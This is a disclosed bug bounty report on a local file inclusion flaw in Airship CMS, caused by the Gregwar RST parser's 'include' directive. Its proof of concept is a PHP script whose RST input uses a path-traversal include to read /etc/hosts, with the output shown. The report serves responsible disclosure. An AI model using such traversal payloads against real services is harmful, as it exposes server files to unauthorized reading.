# [Airship CMS] Local File Inclusion - RST Parser

## Report Details
- **Report ID**: 179034
- **URL**: https://hackerone.com/reports/179034
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-10-30T23:33:43.551Z
- **Disclosed**: 2016-10-31T13:00:04.983Z

## Reporter
- **Username**: h4ckninja
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: paragonie

## Vulnerability Information
Airship uses the very useful RST Parser from Gregwar. However, the parser has the RST directive `include` built-in (why it isn't a separate directive per the spec, I don't know). However, as a result, LFI is possible in Airship.

I realize this isn't directly Paragonie's code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don't appear to take this side effect in to account:

https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186

https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714

The parser has this problem here:

https://github.com/Gregwar/RST/blob/master/Parser.php#L762. There doesn't appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: http://docutils.sourceforge.net/docs/ref/rst/directives.html#include.

To demonstrate:

`rst.php`:

~~~
<?php

require('autoload.php');


$parser = new Gregwar\RST\Parser;

// RST document
$document = '*Test*

.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts

``test``
';

// Parse it
$html = $parser->parse($document);

// Render it
echo $html;
~~~

Output:

~~~
$ php rst.php
<p><em>Test</em></p>
<p>##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting.  Do not change this entry.
##
127.0.0.1	localhost
255.255.255.255	broadcasthost
::1             localhost </p>

[...]
~~~





## Attachments
No attachments
